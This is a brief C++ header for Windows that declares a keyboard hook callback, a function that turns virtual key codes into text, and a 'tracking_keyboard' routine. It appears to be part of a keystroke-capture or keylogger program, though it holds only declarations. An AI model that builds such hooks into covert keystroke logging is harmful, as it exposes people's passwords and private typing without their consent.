#pragma once

#include <codecvt>
#include <Windows.h>
#include <iostream>

std::wstring VirtualKeyCodeToString(UCHAR virtualKey);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void tracking_keyboard();
